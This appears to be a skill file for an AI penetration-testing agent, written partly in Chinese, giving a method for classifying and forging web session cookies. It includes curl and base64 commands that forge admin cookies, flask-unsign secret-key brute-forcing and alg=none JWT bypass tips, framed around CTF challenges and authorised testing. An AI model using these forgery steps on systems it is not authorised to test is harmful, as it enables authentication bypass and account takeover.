---
name: cookie-analysis
description: "Session cookie 分析与伪造方法论。当发现 Web 应用使用 cookie 进行认证、需要判断 cookie 类型并选择伪造方法时使用。覆盖 unsigned base64 cookie 直接伪造、Flask 签名 cookie（flask-unsign 爆破密钥）、加密/二进制 cookie 的识别。本技能负责 cookie 类型判断和分流：如果判断为 JWT（三段式 eyJ 开头），应转至 jwt-attack-methodology；如果判断为加密 cookie 需要 Padding Oracle，应转至 crypto-web-attack"
priority: 8
vuln_types:
  - Cookie安全
  - Session伪造
  - 认证绕过
  - 会话固定
  - JWT攻击
triggers:
  - Cookie
  - Set-Cookie
  - session
  - remember_me
  - HttpOnly
  - SameSite
  - Flask session
  - connect.sid
  - JSESSIONID
  - csrftoken
synonyms:
  - cookie-forgery
  - session-cookie
  - session-analysis
  - flask-cookie
metadata:
  tags: "cookie,session,flask,base64,forgery,authentication,bypass,cookie-analysis,认证绕过,flask-unsign,session cookie,itsdangerous,cookie伪造,unsigned cookie"
  category: discovery
  authority: "expert"
---

# Cookie Analysis & Forgery Methodology

## 0. 立即执行摘要：Cookie 先分型，再测服务端是否信任

看到 Cookie 后不要直接爆破。按下面顺序判断：

1. **属性风险**：检查 `HttpOnly`、`Secure`、`SameSite`、`Domain`、`Path`、`Expires`，判断 XSS/CSRF/子域注入/明文传输风险。
2. **值结构**：识别 JWT、Base64 JSON、Flask/Django/Rails/Express session、加密 blob、随机 session id。
3. **服务端信任边界**：改 `user_id/role/is_admin/tenant_id/exp` 后必须重放请求，只有服务端接受才算漏洞。
4. **会话混用**：删除单个 Cookie、只保留部分 Cookie、A/B 账号 Cookie 交叉混用，测试是否发生会话固定或权限错配。
5. **Remember-me**：长期登录 token、弱随机、可预测、未绑定设备/用户代理时要单独测试。

如果只是能解码 Cookie，但不能证明服务端接受篡改，最多是信息泄露或 `suspected`，不能判定认证绕过。

## 🤖 Agent 工具映射

> 以下 bash/curl 命令仅供理解原理。Agent 应使用对应工具执行：

| 方法论中的命令 | Agent 实际工具 | 用法 |
|---------------|---------------|------|
| `curl -sI` 获取 Set-Cookie | `browser_get_cookies` | 直接获取浏览器所有 Cookie |
| `echo ... \| base64 -d` 解码 | `browser_evaluate` | `browser_evaluate("atob('cookie_value')")` |
| `flask-unsign --decode` | `browser_evaluate` | 手动拆解 `.` 分隔的 cookie，base64 解码第一段 |
| 设置伪造 Cookie | `browser_set_cookie` | `browser_set_cookie(name, forged_value, domain)` |
| `curl -b 'session=...'` 验证 | `proxy_send_request` | 带伪造 Cookie 头请求目标 |

## When to Use
- You found a session cookie and want to forge it
- BEFORE running flask-unsign or any brute-force tool
- When you need to bypass authentication via cookie manipulation

## Step 1: Extract the cookie
```bash
curl -sI http://TARGET/ | grep -i set-cookie
```

## Step 2: Identify cookie type

### Test A: Base64 decode
```bash
echo '<cookie_value>' | base64 -d 2>/dev/null
# Also try URL-decoded version:
python3 -c "import base64,urllib.parse; print(base64.b64decode(urllib.parse.unquote('<cookie>')))"
```

**If it decodes to valid JSON** → **UNSIGNED BASE64** (most common in CTF!)
- Attack: forge directly — takes 5 seconds
```bash
# Forge admin session
echo -n '{"user_id":1}' | base64
# Use as cookie:
curl -b 'session=eyJ1c2VyX2lkIjoxfQ==' http://TARGET/admin/flag
```

- Try variations:
```bash
echo -n '{"user_id":1}' | base64
echo -n '{"role":"admin"}' | base64
echo -n '{"is_admin":true}' | base64
echo -n '{"user_id":1,"role":"admin"}' | base64
echo -n '{"username":"admin"}' | base64
```

### Test B: Flask itsdangerous signature
If the cookie has a `.` followed by a signature portion:
```bash
# Cookie looks like: eyJ...IjoxfQ.Xk2Ypg.dBV2_DkvOBP3...
flask-unsign --decode --cookie '<cookie>'
# If decode works → Flask signed cookie
flask-unsign --unsign --cookie '<cookie>' --wordlist $ABOUTSECURITY_ROOT/Dic/passwords.txt
```

### Test C: JWT
If the cookie has three base64 parts separated by `.`:
```bash
# Header.Payload.Signature
echo '<first_part>' | base64 -d  # Should show {"alg":"...","typ":"JWT"}
# → Use Skill(skill="jwt-attack-methodology")
```

### Test D: Encrypted/Binary
If base64 decode produces garbage → encrypted cookie
- Need key or padding oracle attack
- Check source code for encryption key

## Step 3: Common bypass patterns
- If unsigned: forge with user_id=1, role=admin, is_admin=true
- If Flask-signed: try common keys ('secret', app name, etc.)
- If JWT with alg=none: remove signature, set alg to "none"
- If JWT with HS256: try common secrets, check for JWKS endpoint

## 最低必测自检

标记 `not_vuln` 前必须确认：

| # | 必测项 | 说明 |
|---|---|---|
| 1 | 已记录所有认证相关 Cookie 的属性 | `HttpOnly/Secure/SameSite/Domain/Path/Expires` |
| 2 | 已分型 Cookie 值结构 | JWT、Base64 JSON、签名 Cookie、随机 session id、加密 blob |
| 3 | 已测试删除单个 Cookie、删除全部 Cookie、只保留某个 Cookie | 判断是否存在弱鉴权或多 Cookie 混用 |
| 4 | 已用 A/B 账号交叉替换 Cookie | 判断会话固定、权限错配、Remember-me 绑定缺失 |
| 5 | 可解码 Cookie 已尝试篡改权限字段并由服务端验证 | 前端解析成功不算服务端接受 |
| 6 | JWT 已转入 `jwt-attack-methodology` | Cookie 中的 JWT 不在本 skill 内重复展开 |
| 7 | 加密 Cookie 有异常差异时已转入 `crypto-web-attack` | 例如 padding oracle、MAC 校验差异 |

## Critical Reminders
- NEVER run flask-unsign on unsigned cookies — wastes 25+ minutes and ALWAYS fails
- Always decode the cookie FIRST to determine its type
- Base64 JSON cookies are the most common type in CTF challenges
- Direct forgery takes 5 seconds vs brute-forcing takes 25+ minutes
